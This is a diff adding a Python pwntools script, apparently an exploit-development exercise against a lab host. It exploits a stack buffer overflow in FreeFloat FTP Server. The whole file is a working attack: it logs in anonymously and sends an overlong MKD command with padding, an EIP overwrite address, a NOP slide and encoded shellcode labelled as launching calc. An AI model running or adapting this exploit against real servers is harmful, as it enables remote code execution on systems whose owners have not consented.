@@ -1,0 +1,65 @@
+#!/usr/bin/python
+
+from pwn import *
+
+context(arch = 'i386', os = 'windows', endian = 'little', word_size = 32)
+
+print "[~d47zm3~] freefloatftp - pwntools"
+
+RHOST = "192.168.56.103"
+RPORT = 21
+
+print "[*] targeting %s:%s" % (RHOST, RPORT)
+
+offset=247
+total_len=1000
+eip = 0x7C9D30D7
+# needed more nop slides
+nop_slides = '\x90' * 20
+
+# calc
+shellcode =  ""
+shellcode += "\xd9\xe8\xd9\x74\x24\xf4\xbe\x9b\x23\x43\xfe\x5f"
+shellcode += "\x31\xc9\xb1\x31\x83\xef\xfc\x31\x77\x14\x03\x77"
+shellcode += "\x8f\xc1\xb6\x02\x47\x87\x39\xfb\x97\xe8\xb0\x1e"
+shellcode += "\xa6\x28\xa6\x6b\x98\x98\xac\x3e\x14\x52\xe0\xaa"
+shellcode += "\xaf\x16\x2d\xdc\x18\x9c\x0b\xd3\x99\x8d\x68\x72"
+shellcode += "\x19\xcc\xbc\x54\x20\x1f\xb1\x95\x65\x42\x38\xc7"
+shellcode += "\x3e\x08\xef\xf8\x4b\x44\x2c\x72\x07\x48\x34\x67"
+shellcode += "\xdf\x6b\x15\x36\x54\x32\xb5\xb8\xb9\x4e\xfc\xa2"
+shellcode += "\xde\x6b\xb6\x59\x14\x07\x49\x88\x65\xe8\xe6\xf5"
+shellcode += "\x4a\x1b\xf6\x32\x6c\xc4\x8d\x4a\x8f\x79\x96\x88"
+shellcode += "\xf2\xa5\x13\x0b\x54\x2d\x83\xf7\x65\xe2\x52\x73"
+shellcode += "\x69\x4f\x10\xdb\x6d\x4e\xf5\x57\x89\xdb\xf8\xb7"
+shellcode += "\x18\x9f\xde\x13\x41\x7b\x7e\x05\x2f\x2a\x7f\x55"
+shellcode += "\x90\x93\x25\x1d\x3c\xc7\x57\x7c\x2a\x16\xe5\xfa"
+shellcode += "\x18\x18\xf5\x04\x0c\x71\xc4\x8f\xc3\x06\xd9\x45"
+shellcode += "\xa0\xe9\x3b\x4c\xdc\x81\xe5\x05\x5d\xcc\x15\xf0"
+shellcode += "\xa1\xe9\x95\xf1\x59\x0e\x85\x73\x5c\x4a\x01\x6f"
+shellcode += "\x2c\xc3\xe4\x8f\x83\xe4\x2c\xec\x42\x77\xac\xdd"
+shellcode += "\xe1\xff\x57\x22"
+
+payload = ""
+payload += "A"*(offset-len(payload))
+payload += struct.pack("<I",eip)
+payload += nop_slides
+payload += shellcode
+payload += "D"*(total_len-len(payload)) # trailing padding
+payload += "\n"
+
+
+print "[*] payload offset: %d, overwrite with new eip: %s, total payload lengh: %d" % (offset, eip, total_len)
+print "[*] starting attack..."
+
+p = remote(RHOST, RPORT)
+p.recv(1024)
+p.sendline('USER anonymous\r\n')
+p.recv(1024)
+p.sendline('PASS anonymous\r\n')
+p.recv(1024)
+p.sendline('MKD ' + payload + '\r\n')
+p.recv(1024)
+p.sendline('QUIT\r\n')
+p.clean()
+p.close()
+print "[*] exploit completed!"
